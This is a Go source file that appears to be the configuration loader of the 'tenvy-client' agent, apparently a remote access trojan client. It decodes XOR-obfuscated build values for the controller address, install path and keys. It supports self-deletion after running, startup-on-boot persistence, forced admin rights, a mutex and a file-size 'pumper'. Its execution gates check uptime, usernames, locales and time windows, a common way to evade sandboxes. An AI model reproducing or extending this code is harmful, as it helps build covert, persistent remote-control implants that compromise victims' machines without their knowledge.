package main

import (
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"log"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/rootbay/tenvy-client/internal/agent"
)

var (
	defaultBuildXorKey              = ""
	defaultServerHostEncoded        = ""
	defaultServerPortEncoded        = ""
	defaultInstallPathEncoded       = ""
	defaultEncryptionKeyEncoded     = ""
	defaultMeltAfterRun             = "false"
	defaultStartupOnBoot            = "false"
	defaultMutexKeyEncoded          = ""
	defaultForceAdminRequirement    = "false"
	defaultPollIntervalOverrideMs   = ""
	defaultMaxBackoffOverrideMs     = ""
	defaultShellTimeoutOverrideSecs = ""
	defaultRuntimeConfigEncoded     = ""
	defaultUserAgentOverrideEncoded = ""
	defaultCommandPublicKeyEncoded  = ""
)

func loadRuntimeOptions(logger *log.Logger) (agent.RuntimeOptions, error) {
	serverURL := strings.TrimRight(defaultServerURL(), "/")
	if serverURL == "" {
		return agent.RuntimeOptions{}, errors.New("server url must be provided")
	}

	sharedSecret := strings.TrimSpace(fallback(os.Getenv("TENVY_SHARED_SECRET"), decodeObfuscated(defaultEncryptionKeyEncoded)))
	installPath := fallback(os.Getenv("TENVY_INSTALL_PATH"), decodeObfuscated(defaultInstallPathEncoded))

	preferences := agent.BuildPreferences{
		InstallPath:   installPath,
		MeltAfterRun:  parseBool(defaultMeltAfterRun),
		StartupOnBoot: parseBool(defaultStartupOnBoot),
		MutexKey:      decodeObfuscated(defaultMutexKeyEncoded),
		ForceAdmin:    parseBool(defaultForceAdminRequirement),
	}

	timing := agent.TimingOverride{
		PollInterval: parsePositiveDurationMs(defaultPollIntervalOverrideMs),
		MaxBackoff:   parsePositiveDurationMs(defaultMaxBackoffOverrideMs),
		ShellTimeout: parsePositiveDurationSeconds(defaultShellTimeoutOverrideSecs),
	}

	runtimeConfig := parseEmbeddedRuntimeConfig(logger, defaultRuntimeConfigEncoded)

	userAgent := strings.TrimSpace(fallback(os.Getenv("TENVY_USER_AGENT"), decodeObfuscated(defaultUserAgentOverrideEncoded)))
	commandSecret := strings.TrimSpace(os.Getenv("TENVY_COMMAND_SECRET"))
	commandPublicKey := strings.TrimSpace(fallback(os.Getenv("TENVY_COMMAND_PUBLIC_KEY"), decodeObfuscated(defaultCommandPublicKeyEncoded)))

	opts := agent.RuntimeOptions{
		Logger:            logger,
		ServerURL:         serverURL,
		SharedSecret:      sharedSecret,
		Preferences:       preferences,
		Metadata:          agent.CollectMetadata(buildVersion),
		BuildVersion:      buildVersion,
		UserAgentOverride: userAgent,
		TimingOverride:    timing,
		Watchdog:          runtimeConfig.Watchdog,
		Execution:         runtimeConfig.Execution,
		CustomHeaders:     runtimeConfig.Headers,
		CustomCookies:     runtimeConfig.Cookies,
		EnabledModules:    runtimeConfig.Modules,
		CommandSecret:     commandSecret,
		CommandPublicKey:  commandPublicKey,
	}

	opts.PopulateGeolocationFromEnv()

	return opts, nil
}

func defaultServerURL() string {
	if env := strings.TrimSpace(os.Getenv("TENVY_CONTROLLER_BASE_URL")); env != "" {
		return env
	}

	host := strings.TrimSpace(fallback(decodeObfuscated(defaultServerHostEncoded), "localhost"))
	port := strings.TrimSpace(fallback(decodeObfuscated(defaultServerPortEncoded), "2332"))

	if host == "" {
		host = "localhost"
	}

	if strings.Contains(host, "://") {
		return strings.TrimRight(host, "/")
	}

	if port == "" {
		port = "2332"
	}

	scheme := "https"
	if port == "80" {
		scheme = "http"
	}

	return scheme + "://" + host + ":" + port
}

func decodeBase64(value string) string {
	value = strings.TrimSpace(value)
	if value == "" {
		return ""
	}
	decoded, err := base64.StdEncoding.DecodeString(value)
	if err != nil {
		return ""
	}
	return string(decoded)
}

func decodeObfuscated(encoded string) string {
	if encoded == "" {
		return ""
	}

	data, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return ""
	}

	keyHex := strings.TrimSpace(defaultBuildXorKey)
	if keyHex == "" {
		return string(data)
	}

	key, err := hex.DecodeString(keyHex)
	if err != nil {
		return string(data)
	}

	result := make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		result[i] = data[i] ^ key[i%len(key)]
	}

	return string(result)
}

func parseBool(value string) bool {
	switch strings.ToLower(strings.TrimSpace(value)) {
	case "1", "true", "yes", "on", "enabled":
		return true
	default:
		return false
	}
}

func parsePositiveDurationMs(raw string) time.Duration {
	trimmed := strings.TrimSpace(raw)
	if trimmed == "" {
		return 0
	}
	value, err := strconv.Atoi(trimmed)
	if err != nil || value <= 0 {
		return 0
	}
	return time.Duration(value) * time.Millisecond
}

func parsePositiveDurationSeconds(raw string) time.Duration {
	trimmed := strings.TrimSpace(raw)
	if trimmed == "" {
		return 0
	}
	value, err := strconv.Atoi(trimmed)
	if err != nil || value <= 0 {
		return 0
	}
	return time.Duration(value) * time.Second
}

func fallback(value, fallbackValue string) string {
	if strings.TrimSpace(value) == "" {
		return fallbackValue
	}
	return value
}

type embeddedRuntimeConfig struct {
	Watchdog  agent.WatchdogConfig
	Execution agent.ExecutionGates
	Headers   []agent.CustomHeader
	Cookies   []agent.CustomCookie
	Modules   []string
}

type runtimeConfigPayload struct {
	Watchdog *struct {
		IntervalSeconds int `json:"intervalSeconds"`
	} `json:"watchdog"`
	FilePumper *struct {
		TargetBytes int64 `json:"targetBytes"`
	} `json:"filePumper"`
	Execution *struct {
		DelaySeconds     *int     `json:"delaySeconds"`
		MinUptimeMinutes *int     `json:"minUptimeMinutes"`
		AllowedUsernames []string `json:"allowedUsernames"`
		AllowedLocales   []string `json:"allowedLocales"`
		RequireInternet  bool     `json:"requireInternet"`
		StartTime        string   `json:"startTime"`
		EndTime          string   `json:"endTime"`
	} `json:"executionTriggers"`
	CustomHeaders []struct {
		Key   string `json:"key"`
		Value string `json:"value"`
	} `json:"customHeaders"`
	CustomCookies []struct {
		Name  string `json:"name"`
		Value string `json:"value"`
	} `json:"customCookies"`
	Modules []string `json:"modules"`
}

func parseEmbeddedRuntimeConfig(logger *log.Logger, encoded string) embeddedRuntimeConfig {
	var result embeddedRuntimeConfig
	decoded := decodeBase64(encoded)
	if strings.TrimSpace(decoded) == "" {
		return result
	}

	var payload runtimeConfigPayload
	if err := json.Unmarshal([]byte(decoded), &payload); err != nil {
		if logger != nil {
			logger.Printf("embedded runtime config invalid: %v", err)
		}
		return result
	}

	if payload.Watchdog != nil && payload.Watchdog.IntervalSeconds > 0 {
		interval := time.Duration(payload.Watchdog.IntervalSeconds) * time.Second
		result.Watchdog = agent.WatchdogConfig{Enabled: true, Interval: interval}
	}

	if payload.Execution != nil {
		exec := agent.ExecutionGates{
			Enabled:         true,
			RequireInternet: payload.Execution.RequireInternet,
		}
		if payload.Execution.DelaySeconds != nil && *payload.Execution.DelaySeconds > 0 {
			exec.Delay = time.Duration(*payload.Execution.DelaySeconds) * time.Second
		}
		if payload.Execution.MinUptimeMinutes != nil && *payload.Execution.MinUptimeMinutes > 0 {
			exec.MinUptime = time.Duration(*payload.Execution.MinUptimeMinutes) * time.Minute
		}
		if len(payload.Execution.AllowedUsernames) > 0 {
			exec.AllowedUsernames = sanitizeStringSlice(payload.Execution.AllowedUsernames)
		}
		if len(payload.Execution.AllowedLocales) > 0 {
			exec.AllowedLocales = sanitizeLocaleSlice(payload.Execution.AllowedLocales)
		}
		if start := parseISOTime(payload.Execution.StartTime); start != nil {
			exec.StartAfter = start
		}
		if end := parseISOTime(payload.Execution.EndTime); end != nil {
			exec.EndBefore = end
		}
		result.Execution = exec
	}

	if len(payload.CustomHeaders) > 0 {
		headers := make([]agent.CustomHeader, 0, len(payload.CustomHeaders))
		for _, header := range payload.CustomHeaders {
			key := strings.TrimSpace(header.Key)
			value := strings.TrimSpace(header.Value)
			if key == "" || value == "" {
				continue
			}
			headers = append(headers, agent.CustomHeader{Key: key, Value: value})
		}
		result.Headers = headers
	}

	if len(payload.CustomCookies) > 0 {
		cookies := make([]agent.CustomCookie, 0, len(payload.CustomCookies))
		for _, cookie := range payload.CustomCookies {
			name := strings.TrimSpace(cookie.Name)
			value := strings.TrimSpace(cookie.Value)
			if name == "" || value == "" {
				continue
			}
			cookies = append(cookies, agent.CustomCookie{Name: name, Value: value})
		}
		result.Cookies = cookies
	}

	if payload.Modules != nil {
		if sanitized := sanitizeModuleIDs(payload.Modules); sanitized != nil {
			result.Modules = sanitized
		} else {
			result.Modules = []string{}
		}
	}

	return result
}

func sanitizeStringSlice(values []string) []string {
	if len(values) == 0 {
		return nil
	}
	seen := make(map[string]struct{}, len(values))
	sanitized := make([]string, 0, len(values))
	for _, value := range values {
		trimmed := strings.TrimSpace(value)
		if trimmed == "" {
			continue
		}
		lowered := strings.ToLower(trimmed)
		if _, ok := seen[lowered]; ok {
			continue
		}
		seen[lowered] = struct{}{}
		sanitized = append(sanitized, trimmed)
	}
	if len(sanitized) == 0 {
		return nil
	}
	return sanitized
}

func sanitizeLocaleSlice(values []string) []string {
	if len(values) == 0 {
		return nil
	}
	seen := make(map[string]struct{}, len(values))
	sanitized := make([]string, 0, len(values))
	for _, value := range values {
		trimmed := strings.TrimSpace(value)
		if trimmed == "" {
			continue
		}
		lowered := strings.ToLower(trimmed)
		if _, ok := seen[lowered]; ok {
			continue
		}
		seen[lowered] = struct{}{}
		sanitized = append(sanitized, lowered)
	}
	if len(sanitized) == 0 {
		return nil
	}
	return sanitized
}

func sanitizeModuleIDs(values []string) []string {
	if len(values) == 0 {
		return nil
	}
	seen := make(map[string]struct{}, len(values))
	sanitized := make([]string, 0, len(values))
	for _, value := range values {
		trimmed := strings.TrimSpace(value)
		if trimmed == "" {
			continue
		}
		key := strings.ToLower(trimmed)
		if _, ok := seen[key]; ok {
			continue
		}
		seen[key] = struct{}{}
		sanitized = append(sanitized, trimmed)
	}
	if len(sanitized) == 0 {
		return nil
	}
	return sanitized
}

func parseISOTime(value string) *time.Time {
	trimmed := strings.TrimSpace(value)
	if trimmed == "" {
		return nil
	}
	if parsed, err := time.Parse(time.RFC3339Nano, trimmed); err == nil {
		return &parsed
	}
	if parsed, err := time.Parse(time.RFC3339, trimmed); err == nil {
		return &parsed
	}
	return nil
}
